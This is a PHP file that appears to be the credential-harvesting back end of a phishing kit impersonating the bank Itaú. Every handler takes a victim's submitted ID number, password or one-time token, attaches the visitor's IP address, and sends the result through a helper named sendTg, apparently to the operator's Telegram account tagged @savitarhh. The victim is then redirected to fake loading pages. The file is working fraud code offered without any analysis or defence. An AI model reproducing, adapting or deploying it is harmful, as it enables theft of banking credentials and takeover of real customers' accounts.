<?php
error_reporting(0);
include '../config.php';
include './tg.php';
$ip = $_SERVER['REMOTE_ADDR'];

if (isset($_POST['nro_documento'])) {
    $msg = "➖➖➖[ Itaú ]➖➖➖\r\n";
    $msg .= "✔️ CED : <code>{$_POST['nro_documento']}</code>\r\n";
    $msg .= "✔️ CLA : <code>{$_POST['pass']}</code>\r\n";
    $msg .= "➖➖➖ INFO ➖➖➖\r\n";
    $msg .= "🌐 IP : <code>" . $ip . "</code>\r\n";
    $msg .= "➖➖➖[@savitarhh]➖➖➖\r\n\r\n\r\n";
    sendTg($msg, $key, $id);
    header("location: ../load.php");
}

if (isset($_POST['token'])) {
    $msg = "➖➖➖[ Itaú ]➖➖➖\r\n";
    $msg .= "✔️ TOK : <code>{$_POST['token']}</code>\r\n";
    $msg .= "➖➖➖ INFO ➖➖➖\r\n";
    $msg .= "🌐 IP : <code>" . $ip . "</code>\r\n";
    $msg .= "➖➖➖[@savitarhh]➖➖➖\r\n\r\n\r\n";
    sendTg($msg, $key, $id);
    header("location: ../load2.php");
}

if (isset($_POST['tokenn'])) {
    $msg = "➖➖➖[ Itaú ]➖➖➖\r\n";
    $msg .= "✔️ TOK2 : <code>{$_POST['tokenn']}</code>\r\n";
    $msg .= "➖➖➖ INFO ➖➖➖\r\n";
    $msg .= "🌐 IP : <code>" . $ip . "</code>\r\n";
    $msg .= "➖➖➖[@savitarhh]➖➖➖\r\n\r\n\r\n";
    sendTg($msg, $key, $id);
    header("location: ../load.php");
}
